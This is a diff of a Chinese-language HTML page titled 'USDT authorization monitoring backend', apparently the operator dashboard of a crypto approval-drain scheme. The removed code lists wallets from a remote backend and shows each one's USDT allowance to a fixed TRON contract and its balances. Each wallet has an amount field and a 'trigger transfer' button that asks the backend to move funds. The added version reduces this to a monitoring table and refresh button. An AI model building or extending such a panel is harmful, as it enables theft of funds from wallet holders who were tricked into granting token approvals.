@@ -1,105 +1,26 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
   <title>USDT 授權監控後台</title>
-  <link rel="manifest" href="manifest.json" />
-  <script>
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('./service-worker.js')
-        .then(reg => console.log('✅ Service Worker Registered'))
-        .catch(err => console.warn('❌ Service Worker Failed:', err));
-    }
-  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="manifest" href="manifest.json">
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
-  <style>
-    body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
-    h1 { color: #2c3e50; }
-    .wallet-card {
-      background: #fff;
-      border-radius: 10px;
-      padding: 1em;
-      margin: 1em auto;
-      width: 90%;
-      max-width: 500px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      text-align: left;
-    }
-    button {
-      background: #00b894;
-      border: none;
-      color: white;
-      padding: 0.8em 2em;
-      font-size: 1em;
-      border-radius: 8px;
-      cursor: pointer;
-      margin: 0.5em;
-    }
-    .small-btn {
-      background: #0984e3;
-      padding: 0.4em 1em;
-      font-size: 0.8em;
-    }
-    .input {
-      padding: 0.5em;
-      margin: 0.5em 0;
-      width: 100%;
-      box-sizing: border-box;
-    }
-  </style>
 </head>
 <body>
-  <h1>🔐 USDT 授權監控後台</h1>
-  <div id="wallet-list"></div>
-
-  <script>
-    const API_URL = 'https://peaceful-precious-ceres.glitch.me';
-    const AUTH_CONTRACT = 'TLFVGYGU5wd4z3KzKxr35kNUHQ7zFtff5d';
-
-    async function fetchWallets() {
-      try {
-        const res = await axios.get(`${API_URL}/wallets`);
-        const wallets = res.data;
-        const listEl = document.getElementById('wallet-list');
-        listEl.innerHTML = '';
-
-        for (let wallet of wallets) {
-          const detail = await axios.get(`${API_URL}/wallet-info?address=${wallet.address}`);
-          const info = detail.data;
-
-          const el = document.createElement('div');
-          el.className = 'wallet-card';
-          el.innerHTML = `
-            <b>錢包：</b>${wallet.address}<br>
-            USDT：${info.usdt}<br>
-            授權額度：${info.allowance}<br>
-            TRX 餘額：${info.trx}<br>
-            <input type="number" class="input" placeholder="輸入欲轉金額" id="amt-${wallet.address}" /><br>
-            <button onclick="trigger('${wallet.address}')">🚀 觸發轉帳</button>
-          `;
-          listEl.appendChild(el);
-        }
-      } catch (err) {
-        alert('載入資料失敗');
-      }
-    }
-
-    async function trigger(address) {
-      const input = document.getElementById(`amt-${address}`);
-      const amount = parseFloat(input.value);
-      if (!amount || amount <= 0) return alert('請輸入有效金額');
-
-      try {
-        await axios.post(`${API_URL}/trigger-transfer`, { address, amount });
-        alert('✅ 已送出轉帳請求');
-      } catch (err) {
-        alert('❌ 轉帳失敗');
-      }
-    }
-
-    fetchWallets();
-  </script>
+  <h1>USDT 授權監控後台</h1>
+  <button id="refreshButton">刷新</button>
+  <table id="walletsTable" border="1">
+    <thead>
+      <tr>
+        <th>錢包地址</th>
+        <th>USDT 授權額度</th>
+        <th>TRX 餘額</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+  
+  <script src="script.js"></script>
 </body>
 </html>
